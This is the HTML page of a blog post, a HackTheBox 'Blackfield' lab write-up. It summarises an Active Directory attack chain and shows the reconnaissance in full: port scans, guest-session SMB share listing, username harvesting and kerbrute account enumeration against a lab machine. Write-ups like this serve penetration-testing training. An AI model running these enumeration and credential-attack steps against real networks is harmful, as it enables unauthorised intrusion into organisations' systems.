<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>HackTheBox — Blackfield Writeup | b3t4m3</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Blackfield Writeup" /><meta name="author" content="Carlos Sequeira" /><meta property="og:locale" content="en_US" /><meta name="description" content="Blackfield was a exceptional Windows box centralized on Active Directory environment, initial SMB enumeration reveals potential usernames of Domain accounts. We validate them using kerbrute - a tool which send TGT requests with no pre-authentication property to validate user accounts. Later we use AS-REP roasting technique to find and crack the hash of an account. With the new user creds we’ll use BloodHound to discover an special privilege where we can forcefully change password for another account over RPC. Further with the newly owned account we get access to an SMB share containing data retrieved during audit and forensic investigation, where we find a memory capture of LSASS process and dump the hashes from it using pypykatz. Using the discovered hash we get an WinRM Shell on the box. For elevating privileges to Administrator we’ll abuse Backup privileges of a Backup Operator to grab a copy of NTDS.dit and SYSTEM hive and retrieve Administrator hash." /><meta property="og:description" content="Blackfield was a exceptional Windows box centralized on Active Directory environment, initial SMB enumeration reveals potential usernames of Domain accounts. We validate them using kerbrute - a tool which send TGT requests with no pre-authentication property to validate user accounts. Later we use AS-REP roasting technique to find and crack the hash of an account. With the new user creds we’ll use BloodHound to discover an special privilege where we can forcefully change password for another account over RPC. Further with the newly owned account we get access to an SMB share containing data retrieved during audit and forensic investigation, where we find a memory capture of LSASS process and dump the hashes from it using pypykatz. Using the discovered hash we get an WinRM Shell on the box. For elevating privileges to Administrator we’ll abuse Backup privileges of a Backup Operator to grab a copy of NTDS.dit and SYSTEM hive and retrieve Administrator hash." /><link rel="canonical" href="http://localhost:4000/posts/Blackfield-HTB/" /><meta property="og:url" content="http://localhost:4000/posts/Blackfield-HTB/" /><meta property="og:site_name" content="b3t4m3" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Blackfield.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-08T06:50:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Blackfield.png" /><meta property="twitter:title" content="HackTheBox — Blackfield Writeup" /><meta name="twitter:site" content="@bet4m3" /><meta name="twitter:creator" content="@Carlos Sequeira" /> <script type="application/ld+json"> {"headline":"HackTheBox — Blackfield Writeup","dateModified":"2020-10-08T06:50:00+00:00","datePublished":"2020-10-08T06:50:00+00:00","image":"http://localhost:4000/assets/img/Posts/Blackfield.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Blackfield-HTB/"},"author":{"@type":"Person","name":"Carlos Sequeira"},"@type":"BlogPosting","description":"Blackfield was a exceptional Windows box centralized on Active Directory environment, initial SMB enumeration reveals potential usernames of Domain accounts. We validate them using kerbrute - a tool which send TGT requests with no pre-authentication property to validate user accounts. Later we use AS-REP roasting technique to find and crack the hash of an account. With the new user creds we’ll use BloodHound to discover an special privilege where we can forcefully change password for another account over RPC. Further with the newly owned account we get access to an SMB share containing data retrieved during audit and forensic investigation, where we find a memory capture of LSASS process and dump the hashes from it using pypykatz. Using the discovered hash we get an WinRM Shell on the box. For elevating privileges to Administrator we’ll abuse Backup privileges of a Backup Operator to grab a copy of NTDS.dit and SYSTEM hive and retrieve Administrator hash.","url":"http://localhost:4000/posts/Blackfield-HTB/","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox — Blackfield Writeup | b3t4m3</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Blackfield Writeup" /><meta name="author" content="Carlos Sequeira" /><meta property="og:locale" content="en_US" /><meta name="description" content="Blackfield was a exceptional Windows box centralized on Active Directory environment, initial SMB enumeration reveals potential usernames of Domain accounts. We validate them using kerbrute - a tool which send TGT requests with no pre-authentication property to validate user accounts. Later we use AS-REP roasting technique to find and crack the hash of an account. With the new user creds we’ll use BloodHound to discover an special privilege where we can forcefully change password for another account over RPC. Further with the newly owned account we get access to an SMB share containing data retrieved during audit and forensic investigation, where we find a memory capture of LSASS process and dump the hashes from it using pypykatz. Using the discovered hash we get an WinRM Shell on the box. For elevating privileges to Administrator we’ll abuse Backup privileges of a Backup Operator to grab a copy of NTDS.dit and SYSTEM hive and retrieve Administrator hash." /><meta property="og:description" content="Blackfield was a exceptional Windows box centralized on Active Directory environment, initial SMB enumeration reveals potential usernames of Domain accounts. We validate them using kerbrute - a tool which send TGT requests with no pre-authentication property to validate user accounts. Later we use AS-REP roasting technique to find and crack the hash of an account. With the new user creds we’ll use BloodHound to discover an special privilege where we can forcefully change password for another account over RPC. Further with the newly owned account we get access to an SMB share containing data retrieved during audit and forensic investigation, where we find a memory capture of LSASS process and dump the hashes from it using pypykatz. Using the discovered hash we get an WinRM Shell on the box. For elevating privileges to Administrator we’ll abuse Backup privileges of a Backup Operator to grab a copy of NTDS.dit and SYSTEM hive and retrieve Administrator hash." /><link rel="canonical" href="http://localhost:4000/posts/Blackfield-HTB/" /><meta property="og:url" content="http://localhost:4000/posts/Blackfield-HTB/" /><meta property="og:site_name" content="b3t4m3" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Blackfield.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-08T06:50:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Blackfield.png" /><meta property="twitter:title" content="HackTheBox — Blackfield Writeup" /><meta name="twitter:site" content="@bet4m3" /><meta name="twitter:creator" content="@Carlos Sequeira" /> <script type="application/ld+json"> {"headline":"HackTheBox — Blackfield Writeup","dateModified":"2020-10-08T06:50:00+00:00","datePublished":"2020-10-08T06:50:00+00:00","image":"http://localhost:4000/assets/img/Posts/Blackfield.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Blackfield-HTB/"},"author":{"@type":"Person","name":"Carlos Sequeira"},"@type":"BlogPosting","description":"Blackfield was a exceptional Windows box centralized on Active Directory environment, initial SMB enumeration reveals potential usernames of Domain accounts. We validate them using kerbrute - a tool which send TGT requests with no pre-authentication property to validate user accounts. Later we use AS-REP roasting technique to find and crack the hash of an account. With the new user creds we’ll use BloodHound to discover an special privilege where we can forcefully change password for another account over RPC. Further with the newly owned account we get access to an SMB share containing data retrieved during audit and forensic investigation, where we find a memory capture of LSASS process and dump the hashes from it using pypykatz. Using the discovered hash we get an WinRM Shell on the box. For elevating privileges to Administrator we’ll abuse Backup privileges of a Backup Operator to grab a copy of NTDS.dit and SYSTEM hive and retrieve Administrator hash.","url":"http://localhost:4000/posts/Blackfield-HTB/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="manifest" href="/site.webmanifest"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">b3t4m3</a></div><div class="site-subtitle font-italic">Cybersecurity Specialist & CTF Player</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/bet4m3" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bet4m3" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['b3t4m3','protonmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.eu/profile/163155" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/b3t4m3/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox — Blackfield Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox — Blackfield Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Oct 8, 2020, 6:50 AM +0000" > Oct 8, 2020 <i class="unloaded">2020-10-08T06:50:00+00:00</i> </span> by <span class="author"> Carlos Sequeira </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Oct 8, 2020, 12:55 PM +0530" > Oct 8, 2020 <i class="unloaded">2020-10-08T07:25:09+00:00</i> </span></div></div><div class="post-content"> <img src="/assets/img/Posts/Blackfield.png" class="post-preview-img"><blockquote><p>Blackfield was a exceptional Windows box centralized on Active Directory environment, initial SMB enumeration reveals potential usernames of Domain accounts. We validate them using kerbrute - a tool which send TGT requests with no pre-authentication property to validate user accounts. Later we use AS-REP roasting technique to find and crack the hash of an account. With the new user creds we’ll use BloodHound to discover an special privilege where we can forcefully change password for another account over RPC. Further with the newly owned account we get access to an SMB share containing data retrieved during audit and forensic investigation, where we find a memory capture of LSASS process and dump the hashes from it using pypykatz. Using the discovered hash we get an WinRM Shell on the box. For elevating privileges to Administrator we’ll abuse Backup privileges of a Backup Operator to grab a copy of NTDS.dit and SYSTEM hive and retrieve Administrator hash.</p></blockquote><h2 id="reconnaissance">Reconnaissance</h2><p>We’ll begin with <code class="language-plaintext highlighter-rouge">masscan</code> &amp; <code class="language-plaintext highlighter-rouge">nmap</code> to discover open ports and there consecutive services :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p0-65535</span> <span class="nt">--rate</span><span class="o">=</span>500 10.10.10.192

Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-10-05 08:59:56 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>65536 ports/host]
Discovered open port 135/tcp on 10.10.10.192
Discovered open port 593/tcp on 10.10.10.192
Discovered open port 445/tcp on 10.10.10.192
Discovered open port 53/tcp on 10.10.10.192
Discovered open port 3268/tcp on 10.10.10.192
Discovered open port 88/tcp on 10.10.10.192
Discovered open port 389/tcp on 10.10.10.192
Discovered open port 5985/tcp on 10.10.10.192

cfx:  ~/Documents/htb/blackfield
→ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p135</span>,593,445,53,3268,88,389,5985 10.10.10.192
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-05 14:38 IST
Nmap scan report <span class="k">for </span>10.10.10.192
Host is up <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    <span class="nb">bind
</span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-10-05 16:09:49Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>10/5%Time<span class="o">=</span>5F7AE297%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
SF:ersionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07version</span><span class="se">\</span><span class="s2">
SF:x04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h01m14s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2020-10-05T16:12:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>193.63 seconds
</pre></table></code></div></div><p>Based on the scan results we found the following services running on respective ports:</p><ul><li>Port 53: DNS</li><li>Port 88: kerberos-sec - Active Directory authentication protocol</li><li>Port 135,589: - Windows RPC &amp; RPC over HTTP 1.0</li><li>Port 445: SMB</li><li>Port 389,3268: LDAP</li><li>Port 5985: WinRM</li></ul><p>Domain name: BLACKFIELD.local</p><h3 id="port-445---smb-enumeration">Port 445 - SMB enumeration</h3><p>First, let’s use <code class="language-plaintext highlighter-rouge">smbclient</code> to enumerate available SMB shares:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ smbclient <span class="nt">-L</span> 10.10.10.192
Enter WORKGROUP<span class="se">\r</span>oot<span class="s1">'s password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
</span></pre></table></code></div></div><p>Here looking at smbclient’s output we are unable to figure out which share has READ access.</p><p>We’ll use crackmapexec to enumerate SMB shares, By default if we don’t specify any username or password it attempts for a NULL session and fails as null sessions are not enabled by default on modern versions of Windows Server.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ crackmapexec smb <span class="nt">--shares</span> 10.10.10.192 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span>-] BLACKFIELD.local<span class="se">\:</span> STATUS_ACCESS_DENIED
SMB         10.10.10.192    445    DC01             <span class="o">[</span>-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED<span class="o">({</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights.<span class="o">)</span>
</pre></table></code></div></div><p>However, if we input any invalid username without password, it connects with a guest session:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ crackmapexec smb <span class="nt">--shares</span> 10.10.10.192 <span class="nt">-u</span> <span class="s1">'cfx'</span> <span class="nt">-p</span> <span class="s1">''</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\c</span>fx:
SMB         10.10.10.192    445    DC01             <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.192    445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.192    445    DC01             C<span class="nv">$ </span>                             Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share
SMB         10.10.10.192    445    DC01             profiles<span class="nv">$ </span>      READ
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share

</pre></table></code></div></div><p>Two unusual shares listed are <code class="language-plaintext highlighter-rouge">forensic</code> and <code class="language-plaintext highlighter-rouge">profiles$</code> but we have access to READ <code class="language-plaintext highlighter-rouge">profiles$</code> share only so let’s look inside it:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ smbclient //10.10.10.192/profiles<span class="se">\$</span>
Enter WORKGROUP<span class="se">\r</span>oot<span class="s1">'s password:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Jun  3 22:17:12 2020
  ..                                  D        0  Wed Jun  3 22:17:12 2020
  AAlleni                             D        0  Wed Jun  3 22:17:11 2020
  ABarteski                           D        0  Wed Jun  3 22:17:11 2020
  ABekesz                             D        0  Wed Jun  3 22:17:11 2020
  ABenzies                            D        0  Wed Jun  3 22:17:11 2020
  ABiemiller                          D        0  Wed Jun  3 22:17:11 2020
  AChampken                           D        0  Wed Jun  3 22:17:11 2020
[..SNIP..]
  ZMalaab                             D        0  Wed Jun  3 22:17:12 2020
  ZMiick                              D        0  Wed Jun  3 22:17:12 2020
  ZScozzari                           D        0  Wed Jun  3 22:17:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 22:17:12 2020
  ZWausik                             D        0  Wed Jun  3 22:17:12 2020

                7846143 blocks of size 4096. 3955786 blocks available
</span></pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">profiles$</code> looks like containing directories of users which could be member of Domain controller, to copy all these usernames to a file we’ll send our command with smbclient and pipe the output to awk to print the first field save it inside a separate file.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ smbclient //10.10.10.192/profiles<span class="se">\$</span> <span class="nt">-c</span> <span class="nb">ls</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="o">&gt;</span> users.txt

cfx:  ~/Documents/htb/blackfield
→ <span class="nb">cat </span>users.txt
<span class="nb">.</span>
..
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
</pre></table></code></div></div><h3 id="kerbrute---validating-usernames">Kerbrute - Validating Usernames</h3><p>Now that we have lots of potential usernames let’s use <a href="https://github.com/ropnop/kerbrute/releases"><strong>kerbrute</strong></a> which is a tool used to bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.</p><p>To find our valid domain usernames we’ll use <code class="language-plaintext highlighter-rouge">userenum</code> command:</p><blockquote><p>To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a Windows event ID 4768 if Kerberos logging is enabled.</p></blockquote><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ ./kerbrute_linux_amd64 userenum <span class="nt">--dc</span> 10.10.10.192 <span class="nt">-d</span> BLACKFIELD.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 10/05/20 - Ronnie Flathers @ropnop

2020/10/05 15:28:26 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2020/10/05 15:28:26 <span class="o">&gt;</span>   10.10.10.192:88

2020/10/05 15:28:47 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       audit2020@BLACKFIELD.local
2020/10/05 15:30:47 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       support@BLACKFIELD.local
2020/10/05 15:30:52 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2020/10/05 15:31:20 <span class="o">&gt;</span>  Done! Tested 315 usernames <span class="o">(</span>3 valid<span class="o">)</span> <span class="k">in </span>174.027 seconds
